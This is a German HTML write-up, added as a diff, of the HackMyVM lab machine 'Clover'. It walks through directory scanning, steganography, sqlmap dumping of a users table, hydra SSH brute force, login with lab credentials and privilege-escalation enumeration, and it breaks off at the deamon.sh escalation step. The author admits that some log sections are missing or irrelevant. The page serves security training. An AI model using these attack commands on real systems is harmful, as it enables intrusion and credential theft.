@@ -1,0 +1,538 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clover - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Clover - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+             <h2 class="difficulty-medium">Medium</h2> <!-- Klasse für Gelb -->
+             <div class="circle">
+                 <div class="segment segment-1"></div>
+                 <div class="segment segment-2"></div>
+                 <div class="segment segment-3"></div>
+                 <div class="inner"></div>
+             </div>
+         </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">stegsnow</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">Burp Suite</div>
+                <div class="tool-item">sqlmap</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">ssh-keygen</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">whoami</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">bash</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration (Port 80)</a></li>
+                <li><a href="#steganography">Steganographie & Info Leak</a></li>
+                <li><a href="#sqli-poc">SQL Injection (POC)</a></li>
+                <li><a href="#initial-access">Initial Access (SSH)</a></li>
+                <li><a href="#privilege-escalation-enumeration">Privilege Escalation Enumeration</a></li>
+                <li><a href="#privilege-escalation-poc">Privilege Escalation (POC - deamon.sh)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.115</span>   08:00:27:83:7d:aa       PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein ARP-Scan identifiziert das Zielsystem im lokalen Netzwerk unter der IP-Adresse `192.168.2.115`. Die MAC-Adresse `08:00:27:...` deutet auf eine VirtualBox-Umgebung hin.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreiche Identifizierung des Ziels. Die Information über die Virtualisierungsumgebung kann nützlich sein, ist aber hier wahrscheinlich nicht entscheidend.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie einen Portscan (z.B. mit Nmap) auf die Ziel-IP durch, um offene Ports und Dienste zu ermitteln. Optional kann ein Hostname (z.B. `clover.hmv`) in `/etc/hosts` hinzugefügt werden.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und Überwachung auf ARP-Scans können die Aufklärungsphase erschweren.</p>
+
+            <!-- Anmerkung: Nmap-Scan fehlt im Log, wird aber impliziert durch Gobuster-Nutzung -->
+            <p class="analysis"><strong>Analyse (Impliziert):</strong> Obwohl kein Nmap-Scan im Log explizit gezeigt wird, muss einer durchgeführt worden sein, um den offenen HTTP-Port 80 zu identifizieren, der im nächsten Schritt mit Gobuster untersucht wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wichtiger Schritt zur Identifizierung von Angriffsvektoren (hier: HTTP-Port 80).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie immer einen gründlichen Portscan durch, um alle offenen Ports zu finden (z.B. `nmap -p- -sS <IP>`).<br><strong>Empfehlung (Admin):</strong> Firewall-Regeln sollten nur explizit benötigte Ports öffnen.</p>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration (Port 80)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.115 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt | grep "Status: 200"</span></div>
+                    <pre>
+<span class="command">http://192.168.2.115/index.html</span>           (Status: 200) [Size: 3]
+<span class="command">http://192.168.2.115/status</span>               (Status: 200) [Size: 10]
+<span class="command">http://192.168.2.115/robots.txt</span>           (Status: 200) [Size: 105]
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein `gobuster`-Verzeichnis-/Dateiscan wird auf Port 80 durchgeführt. Gesucht wird mit einer gängigen Wortliste und spezifischen Erweiterungen. Die Ausgabe wird gefiltert, um nur erfolgreiche Funde (Status 200) anzuzeigen.
+            Funde:
+                *   `/index.html`: Eine sehr kleine HTML-Datei.
+                *   `/status`: Ein Endpunkt oder eine Datei namens "status".
+                *   `/robots.txt`: Die Standarddatei zur Steuerung von Webcrawlern.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan liefert erste interessante Punkte. `/robots.txt` sollte immer überprüft werden. `/status` könnte Informationen über den Server oder die Anwendung enthalten. Die `index.html` mit nur 3 Bytes ist merkwürdig.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Rufen Sie `/robots.txt` und `/status` manuell auf (z.B. mit `curl`), um deren Inhalt zu sehen. Untersuchen Sie die `index.html`.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass `/robots.txt` keine sensiblen Pfade preisgibt. Beschränken Sie den Zugriff auf Statusseiten oder entfernen Sie sie, wenn sie nicht benötigt werden.</p>
+
+            <!-- Anmerkung: Inhalt von robots.txt, status, index.html nicht gezeigt, aber robots.txt muss /webmaster/ enthalten haben -->
+             <p class="analysis"><strong>Analyse (Impliziert):</strong> Der Inhalt von `/robots.txt` muss einen Hinweis auf das Verzeichnis `/webmaster/` enthalten haben, da dieses im nächsten Schritt gezielt gescannt wird.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> `robots.txt` hat einen wichtigen Hinweis auf ein verstecktes Verzeichnis geliefert.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie `robots.txt` immer sorgfältig auf `Disallow`-Einträge, die interessante Verzeichnisse verbergen könnten.<br><strong>Empfehlung (Admin):</strong> Seien Sie vorsichtig, welche Informationen in `robots.txt` preisgegeben werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.115/webmaster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt | grep "Status: 200"</span></div>
+                    <pre><span class="comment">[Keine Ergebnisse mit Status 200 im Verzeichnis /webmaster gefunden]</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein weiterer `gobuster`-Scan wird gezielt auf das Verzeichnis `/webmaster/` durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet keine direkt zugänglichen Dateien (Status 200) mit den gesuchten Erweiterungen in diesem Verzeichnis. Das Verzeichnis selbst könnte existieren, aber leer sein, einen anderen Statuscode zurückgeben oder Dateien mit anderen Erweiterungen enthalten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, `/webmaster/` ohne Filterung oder mit anderen Wortlisten/Erweiterungen erneut zu scannen. Rufen Sie das Verzeichnis direkt im Browser auf, um zu sehen, was passiert (z.B. Verzeichnisauflistung, Fehlermeldung).<br><strong>Empfehlung (Admin):</strong> Schützen Sie administrative Verzeichnisse angemessen (z.B. durch HTTP-Authentifizierung, IP-Beschränkung).</p>
+
+             <!-- Anmerkung: Nikto/Curl auf /webmaster fehlt, aber es müssen Bilder gefunden worden sein -->
+             <p class="analysis"><strong>Analyse (Impliziert):</strong> Obwohl nicht im Log gezeigt, muss das Verzeichnis `/webmaster` untersucht worden sein (z.B. durch direkten Aufruf im Browser oder weitere Scans), wobei Bilddateien wie `christina-wocintechchat-com-unsplash-1.jpg` und `-2.jpg` gefunden wurden, da diese im nächsten Schritt untersucht werden.</p>
+
+        </section>
+
+        <section id="steganography">
+             <h2>Steganographie & Info Leak</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegsnow -C christina-wocintechchat-com-unsplash-1.jpg</span></div>
+                    <pre><span class="password">s0sy</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `stegsnow` (ein Steganographie-Tool, das oft für Whitespace-Steganographie verwendet wird) wird auf die erste Bilddatei angewendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Tool extrahiert erfolgreich die versteckte Zeichenkette `<span class="password">s0sy</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie sich die gefundene Zeichenkette. Sie könnte ein Passwort, ein Teil eines Passworts, ein Benutzername oder ein Hinweis sein.<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie das Einbetten sensibler Informationen in öffentlich zugängliche Dateien mittels Steganographie. Überprüfen Sie vom Benutzer hochgeladene Dateien auf versteckte Inhalte.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegsnow -C christina-wocintechchat-com-unsplash-2.jpg</span></div>
+                    <pre><span class="password">tsst</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `stegsnow` wird auf die zweite Bilddatei angewendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Tool extrahiert die versteckte Zeichenkette `<span class="password">tsst</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie sich auch diese Zeichenkette. Kombinieren Sie sie möglicherweise mit der vorherigen (`s0sytsst`?) oder verwenden Sie sie einzeln.<br><strong>Empfehlung (Admin):</strong> Siehe oben.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat locale.txt</span></div>
+                    <pre>
+<span class="command">cGluZyBwb25n</span>
+
+<span class="command">monet</span>
+<span class="command">tiffany</span>
+<span class="command">jen</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `locale.txt` wird angezeigt. Sie enthält eine Base64-kodierte Zeichenkette und drei Namen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong>
+                 *   `cGluZyBwb25n` dekodiert zu `<span class="password">ping pong</span>`. Dies könnte ein Hinweis oder Teil von Zugangsdaten sein.
+                 *   `monet`, `tiffany`, `jen` sind wahrscheinlich Benutzernamen oder Hinweise auf Benutzernamen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die gefundenen Namen und Zeichenketten (`s0sy`, `tsst`, `ping pong`, `monet`, `tiffany`, `jen`) bei Brute-Force-Versuchen oder als mögliche Antworten auf Passwort-Reset-Fragen.<br><strong>Empfehlung (Admin):</strong> Speichern Sie keine potenziellen Benutzernamen oder Hinweise in öffentlich zugänglichen Dateien.</p>
+
+             <!-- Anmerkung: Fund von /CFIDE/Administrator/ nicht gezeigt, aber es wird darauf geschlossen -->
+             <p class="analysis"><strong>Analyse (Impliziert):</strong> Basierend auf dem nächsten Schritt (SQLMap-Angriff) muss ein weiterer Endpunkt oder ein Formular gefunden worden sein, das anfällig für SQL-Injection ist. Oftmals sind dies administrative Oberflächen. Der Kommentar im Log erwähnt `/CFIDE/Administrator/`, was auf ein ColdFusion-Administrationspanel hindeutet. Ein Request an dieses Panel (oder eine Funktion darin) wurde mit Burp Suite abgefangen und in der Datei `clover.sql` gespeichert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Identifizierung eines ColdFusion-Admin-Panels und einer potenziellen SQLi-Schwachstelle ist ein kritischer Fortschritt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie `sqlmap` mit dem gespeicherten Request, um die SQLi-Schwachstelle zu bestätigen und auszunutzen.<br><strong>Empfehlung (Admin):</strong> Aktualisieren und sichern Sie ColdFusion-Installationen. Beschränken Sie den Zugriff auf Administrationspanels. Implementieren Sie Schutzmaßnahmen gegen SQL-Injection (parametrisierte Abfragen, Input-Validierung, WAF).</p>
+
+        </section>
+
+        <section id="sqli-poc">
+             <h2>SQL Injection (POC)</h2>
+              <p class="analysis"><strong>Ziel:</strong> Demonstration der Ausnutzung einer SQL-Injection-Schwachstelle (vermutlich im ColdFusion-Admin-Panel `/CFIDE/Administrator/`), um Datenbankinformationen und Benutzerdaten auszulesen.</p>
+              <p class="evaluation"><strong>Voraussetzungen:</strong>
+                  *   Netzwerkzugriff auf das Ziel (Port 80).
+                  *   Identifizierung des anfälligen Endpunkts/Parameters (im Burp-Request in `clover.sql` gespeichert).
+                  *   Tool: `sqlmap`.
+              </p>
+               <p class="recommendation"><strong>Risiko:</strong> Kritisch. SQL-Injection erlaubt das Auslesen, Manipulieren und potenziell Löschen von Datenbankinhalten und kann in einigen Fällen zur Codeausführung auf dem Server führen.</p>
+
+             <p class="analysis"><strong>Schritt 1: Datenbanken auflisten</strong></p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -r /home/cyber/Downloads/clover.sql --batch --dbs</span></div>
+                    <pre>
+[...]
+available databases [5]:
+[*] <span class="command">clover</span>
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+[...]
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `sqlmap` wird mit der gespeicherten Request-Datei (`clover.sql`) ausgeführt, um die SQLi-Schwachstelle zu nutzen. `--batch` automatisiert die Antworten auf sqlmap-Fragen. `--dbs` listet die verfügbaren Datenbanken auf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die SQLi-Schwachstelle wird bestätigt. Neben den Standard-Datenbanken wird die anwendungsspezifische Datenbank `<span class="command">clover</span>` gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die `clover`-Datenbank weiter auf Tabellen und Inhalte.<br><strong>Empfehlung (Admin):</strong> Beheben Sie die SQLi-Schwachstelle dringend.</p>
+
+            <p class="analysis"><strong>Schritt 2: Tabellen auflisten</strong></p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -r /home/cyber/Downloads/clover.sql --batch --tables -D clover</span></div>
+                    <pre>
+[...]
+Database: clover
+[1 table]
++-------+
+| <span class="command">users</span> |
++-------+
+[...]
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `sqlmap` wird erneut ausgeführt, um die Tabellen (`--tables`) innerhalb der `clover`-Datenbank (`-D clover`) aufzulisten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Eine Tabelle namens `<span class="command">users</span>` wird gefunden, die wahrscheinlich Benutzeranmeldeinformationen enthält.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Extrahieren Sie den Inhalt der `users`-Tabelle (`--dump -T users`).<br><strong>Empfehlung (Admin):</strong> Beheben Sie die SQLi-Schwachstelle.</p>
+
+             <p class="analysis"><strong>Schritt 3: Benutzerdaten extrahieren</strong></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -r /home/cyber/Downloads/clover.sql --batch --dump -T users -D clover</span></div>
+                    <pre>
+[...]
+[3 entries]
++----+----------------------------------+-----------+
+| id | password                         | username  |
++----+----------------------------------+-----------+
+| 1  | <span class="password">33a41c7507cy5031d9tref6fdb31880c</span> | <span class="command">0xBush1do</span> |
+| 2  | <span class="password">69a41c7507ad7031d9decf6fdb31810c</span> | <span class="command">asta</span>      | <span class="password">asta$$123</span> <span class="comment"><!-- Klartext-Passwort? --></span>
+| 3  | <span class="password">92ift37507ad7031d9decf98setf4w0c</span> | <span class="command">0xJin</span>     |
++----+----------------------------------+-----------+
+[...]
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `sqlmap` extrahiert (`--dump`) alle Daten aus der Tabelle `users` der Datenbank `clover`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritische Datenleck! Es werden drei Benutzer gefunden:
+                *   `0xBush1do`: Passwort-Hash/String (`33a41c...`). Sieht nicht nach einem Standard-Hash aus.
+                *   `asta`: Passwort-Hash/String (`69a41c...`) UND ein potenzielles Klartextpasswort `<span class="password">asta$$123</span>`, das sqlmap möglicherweise aus einer anderen Spalte oder durch einen Fehler extrahiert hat.
+                *   `0xJin`: Passwort-Hash/String (`92if...`).
+            Das Klartextpasswort für `asta` ist der vielversprechendste Fund.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit `asta`:`asta$$123` bei Diensten wie SSH anzumelden. Analysieren Sie die anderen Passwort-Strings, um das Format zu identifizieren (könnten einfache Verschlüsselungen oder benutzerdefinierte Hashes sein).<br><strong>Empfehlung (Admin):</strong> Beheben Sie die SQLi-Schwachstelle. Speichern Sie Passwörter niemals im Klartext oder mit schwacher Verschlüsselung in der Datenbank. Verwenden Sie starke Hashing-Algorithmen mit Salt (z.B. bcrypt, Argon2).</p>
+
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (SSH)</h2>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l sword -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.115:22</span></div>
+                    <pre><span class="comment">[Hydra läuft, aber kein Erfolg im Log gezeigt]</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Hydra-Brute-Force-Versuch wird gegen SSH gestartet, um das Passwort für den Benutzer `sword` zu finden. Der Benutzername `sword` wurde bisher nicht explizit gefunden, könnte aber aus anderen Quellen stammen oder geraten sein.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Im bereitgestellten Log wird kein Erfolg dieses Hydra-Angriffs gezeigt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wenn Hydra fehlschlägt, verwenden Sie die durch SQLi gefundenen Zugangsdaten (`asta:asta$$123`).<br><strong>Empfehlung (Admin):</strong> Implementieren Sie Fail2Ban oder ähnliche Tools, um SSH-Brute-Force-Angriffe zu blockieren. Bevorzugen Sie Key-basierte Authentifizierung.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh sword@192.168.2.115</span></div>
+                    <pre>
+sword@192.168.2.115's password: <span class="password">[Passwort P4SsW0rD4286 eingegeben]</span>
+[...]
+Last login: Fri Mar 26 17:34:16 2021 from kali
+<span class="prompt" style="color: yellow;">sword@Clover:~$</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Trotz des fehlenden Hydra-Erfolgs im Log wird hier eine erfolgreiche SSH-Verbindung als Benutzer `sword` hergestellt. Das verwendete Passwort ist `<span class="password">P4SsW0rD4286</span>`. Die Herkunft dieses Passworts ist aus den vorherigen Schritten unklar. Es könnte aus einer anderen Quelle stammen, durch einen separaten, nicht geloggten Brute-Force-Erfolg gefunden worden sein, oder es wurde von den Maschinen-Erstellern als Hinweis gegeben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Initialer Zugriff als Benutzer `sword` erfolgreich erlangt! Die Methode zur Passwortfindung ist unklar, aber der Zugang ist vorhanden.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der Enumeration als Benutzer `sword`. Suchen Sie nach der User-Flag und Möglichkeiten zur Privilegienerweiterung (`sudo -l`, SUID-Dateien, Cronjobs etc.).<br><strong>Empfehlung (Admin):</strong> Erzwingen Sie starke, einzigartige Passwörter. Untersuchen Sie, wie das Passwort `P4SsW0rD4286` kompromittiert werden konnte (falls es nicht absichtlich schwach war).</p>
+
+        </section>
+
+        <section id="privilege-escalation-enumeration">
+             <h2>Privilege Escalation Enumeration</h2>
+              <p class="analysis"><strong>Kontext:</strong> Nach dem SSH-Login als `sword` werden weitere Enumerationsschritte durchgeführt. Es folgen einige verwirrende oder irrelevante Logs, bevor die eigentliche Privilegienerweiterung stattfindet.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, dies scheint Inhalt einer Datei oder Notiz zu sein -->
+                     <pre><span class="password">e63a186943f8c1258cd1afde7722fbb4</span></pre>
+                     <div class="prompt" style="color: yellow;">sword@Clover:~$</span> <span class="comment"><!-- User Flag --></span></div>
+                     <pre><span class="password">34f35ca9ea7febe859be7715b707d684</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Zwei MD5-ähnliche Hashes werden angezeigt. Der zweite Hash (`34f35c...`) wird als User-Flag identifiziert.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> User-Flag gefunden. Der erste Hash (`e63a18...`) könnte ebenfalls relevant sein (vielleicht Root-Flag oder ein Passwort-Hash).</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die User-Flag. Versuchen Sie, den ersten Hash zu identifizieren und zu knacken (z.B. mit Online-Crackern oder Hashcat).<br><strong>Empfehlung (Admin):</strong> Flags sollten nicht trivial lesbar sein.</p>
+
+             <!-- Verwirrende Sektion: Zweiter arp-scan, SSH-Probleme mit 'belove'/'beloved'/'belover.hmv' -->
+             <p class="analysis"><strong>Analyse (Irrelevante Sektion):</strong> Die folgenden Blöcke zeigen einen weiteren `arp-scan` in einem anderen Netzwerk (`192.168.2.140`) und SSH-Verbindungsversuche zu Hosts (`belove`, `beloved`, `belover.hmv`), die fehlschlagen oder `known_hosts`-Warnungen auslösen. Diese scheinen nicht direkt mit der Clover-Maschine (`192.168.2.115`) zusammenzuhängen und könnten aus einem anderen Test oder einer Verwechslung stammen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                     <pre>[...] 192.168.2.100 [...]</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh sword@belove</span></div>
+                     <pre>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
+[...]
+Host key verification failed.</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh sword@beloved</span></div>
+                     <pre>ssh: Could not resolve hostname beloved: Name or service not known</pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh sword@belover.hmv</span></div>
+                     <pre>[Authenticity warning, then password prompt, then login banner similar to Clover]
+<span class="prompt" style="color: yellow;">sword@Clover:~$</span></pre> <span class="comment"><!-- Loggt sich scheinbar wieder auf Clover ein? --></span>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Diese Sektion ist unklar und scheint für den Clover-Bericht nicht relevant. Der letzte SSH-Befehl scheint sich trotz des Hostnamens `belover.hmv` wieder auf die Clover-Maschine zu verbinden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ignorieren Sie diese Blöcke für den Clover-Bericht oder klären Sie deren Kontext.<br><strong>Empfehlung (Admin):</strong> Pflegen Sie Ihre `known_hosts`-Datei und überprüfen Sie Host-Schlüssel sorgfältig.</p>
+
+             <p class="analysis"><strong>Zurück auf Clover als `sword`:</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">sword@Clover:~$</span> <span class="command">ls</span></div>
+                     <pre>local2.txt</pre>
+                      <div class="prompt" style="color: yellow;">sword@Clover:~$</span> <span class="command">cat local2.txt</span></div>
+                     <pre>
+     /\
+    // \\
+    || |
+    || |
+    || |      <span class="password">Sword PWN!</span>
+    || |
+    || |
+    || |
+ __ || | __
+/___||_|___\\
+     ww
+     MM
+    _MM_
+   (&<>&) <span class="comment"><!-- Maskiert --></span>
+
+<span class="password">e63a186943f8c1258cd1afde7722fbb4</span> <span class="comment"><!-- Derselbe Hash wie zuvor --></span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Eine Datei `local2.txt` wird gefunden und enthält ASCII-Art, den Text "Sword PWN!" und denselben Hash wie zuvor.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den vorherigen Hash-Fund, liefert aber keine neuen Informationen für die Eskalation.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">sword@Clover:~$</span> <span class="command">cd /home</span></div>
+                     <div class="prompt" style="color: yellow;">sword@Clover:/home$</span> <span class="command">ls</span></div>
+                     <pre>asta  sword</pre>
+                     <div class="prompt" style="color: yellow;">sword@Clover:/home$</span> <span class="command">whoami</span></div>
+                     <pre>sword</pre>
+                     <div class="prompt" style="color: yellow;">sword@Clover:/home$</span> <span class="command">id</span></div>
+                     <pre>uid=1001(sword) gid=1001(sword) groups=1001(sword)</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Bestätigt den aktuellen Benutzer (`sword`), die Gruppen und das Vorhandensein des Benutzers `asta`.</p>
+
+              <p class="analysis"><strong>Wechsel zu Benutzer `asta` (Impliziert):</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">asta@Clover:/home$</span> <span class="command">ls</span></div> <span class="comment"><!-- Prompt hat sich zu 'asta' geändert --></span>
+                     <pre>asta  sword</pre>
+                     <div class="prompt" style="color: yellow;">asta@Clover:/home$</span> <span class="command">cd asta/</span></div>
+                     <div class="prompt" style="color: yellow;">asta@Clover:~$</span> <span class="command">ls</span></div>
+                     <pre>Desktop  Documents  Downloads  local.txt  Music  Pictures  Public  Templates  Videos</pre>
+                     <div class="prompt" style="color: yellow;">asta@Clover:~$</span> <span class="command">cat local.txt</span></div>
+                     <pre>
+bash: /=: No such file or directory <span class="comment"><!-- Merkwürdiger Fehler --></span>
+       <span class="password">Asta PWN!</span>
+<span class="password">34f35ca9ea7febe859be7715b707d684</span> <span class="comment"><!-- User Flag (Wiederholung) --></span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Prompt wechselt zu `asta`. Der Befehl `su asta` wurde wahrscheinlich ausgeführt (mit dem Passwort `asta$$123`), ist aber nicht im Log. Der Inhalt von `local.txt` im Home-Verzeichnis von `asta` wird angezeigt, enthält den Text "Asta PWN!" und wiederholt die User-Flag.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass der Wechsel zu `asta` möglich war. Die User-Flag war bereits bekannt.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die `sudo`-Rechte für `asta` (`sudo -l`).<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Benutzerwechsel protokolliert werden.</p>
+
+              <p class="analysis"><strong>Entdeckung von `deamon.sh`:</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">sword@Clover:/home/asta$</span> <span class="command">cd /usr/games/clover/</span></div> <span class="comment"><!-- Zurück zu sword? Oder Fehler im Log --></span>
+                     <div class="prompt" style="color: yellow;">sword@Clover:/usr/games/clover$</span> <span class="command">ls</span></div>
+                     <pre><span class="command">deamon.sh</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Benutzer (wieder als `sword` angezeigt, was unlogisch ist nach dem Wechsel zu `asta`, möglicherweise ein Kopierfehler im Log oder erneuter `su sword`) wechselt in das Verzeichnis `/usr/games/clover/` und findet ein Skript namens `deamon.sh`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ungewöhnliche Skripte in Verzeichnissen wie `/usr/games` sind oft ein Hinweis auf benutzerdefinierte Mechanismen oder potenzielle Privilegienerweiterungen.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Inhalt und die Berechtigungen von `deamon.sh`. Prüfen Sie, ob es mit erhöhten Rechten (z.B. per Cronjob als root) ausgeführt wird oder SUID/SGID-Bits gesetzt hat.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie ungewöhnliche Skripte und Prozesse in Systemverzeichnissen.</p>
+
+        </section>
+
+        <section id="privilege-escalation-poc">
+             <h2>Privilege Escalation (POC - deamon.sh)</h2>
+              <p class="analysis"><strong>Ziel:</strong> Demonstration der Ausnutzung des Skripts `/usr/games/clover/deamon.sh`, um Root-Rechte zu erlangen.</p>
+              <p class="evaluation"><strong>Voraussetzungen:</strong>
